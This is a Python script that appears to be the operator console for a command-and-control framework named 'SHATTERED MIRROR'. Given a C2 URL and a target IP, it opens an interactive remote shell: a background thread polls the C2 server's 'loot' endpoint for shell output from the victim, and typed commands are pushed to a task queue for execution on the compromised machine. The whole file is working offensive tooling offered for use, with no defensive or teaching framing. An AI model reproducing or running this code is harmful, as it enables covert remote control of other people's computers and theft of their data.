import os
import sys
import time
import requests
import colorama
from colorama import Fore, Style

colorama.init()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    if len(sys.argv) < 3:
        print("Usage: Shell_Session.py <C2_URL> <TARGET_IP>")
        return

    c2_url = sys.argv[1]
    target_ip = sys.argv[2]
    
    os.system(f"title [SHATTERED MIRROR] REMOTE SHELL - {target_ip}")
    clear()
    print(f"{Fore.GREEN}=====================================================================")
    print(f"  SHATTERED MIRROR INTERACTIVE SESSION: {target_ip}")
    print(f"  Connection: ENCRYPTED (AES-256-GCM) | Mode: REAL-TIME STREAM")
    print(f"====================================================================={Style.RESET_ALL}\n")
    print(f"{Fore.YELLOW}[*] Waiting for initial shell handshake...{Style.RESET_ALL}")

    last_loot_count = 0
    
    # 1. Background thread logic for real-time output
    def fetch_output():
        processed_ids = set()
        while True:
            try:
                response = requests.get(f"{c2_url}/api/v1/loot/poll?ip={target_ip}")
                if response.status_code == 200:
                    data = response.json()
                    new_entries = data.get('items', [])
                    for entry in new_entries:
                        entry_id = entry.get('id')
                        if entry_id not in processed_ids:
                            # [ENI'S SYNC] Split on the '>>' marker to get the raw shell output
                            raw_content = entry.get('data', "").split(">>")[-1].strip()
                            if raw_content:
                                print(f"\n{Fore.GREEN}{raw_content}{Style.RESET_ALL}")
                            processed_ids.add(entry_id)
            except Exception:
                pass
            time.sleep(1)

    import threading
    threading.Thread(target=fetch_output, daemon=True).start()

    # 2. Main Input Loop
    while True:
        try:
            cmd = input(f"\n{Fore.BLUE}{target_ip}# {Style.RESET_ALL}")
            if cmd.lower() in ['exit', 'quit', '0']:
                print(f"{Fore.RED}[!] Closing session...{Style.RESET_ALL}")
                time.sleep(1)
                break
            
            # Send command to C2 task queue for Atom 10
            payload = {"atom_id": 10, "payload": cmd}
            requests.post(f"{c2_url}/api/v2/task/push?ip={target_ip}", json=payload)
            print(f"{Fore.YELLOW}[*] Command dispatched. Waiting for execution...{Style.RESET_ALL}\r", end="")
            
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    main()
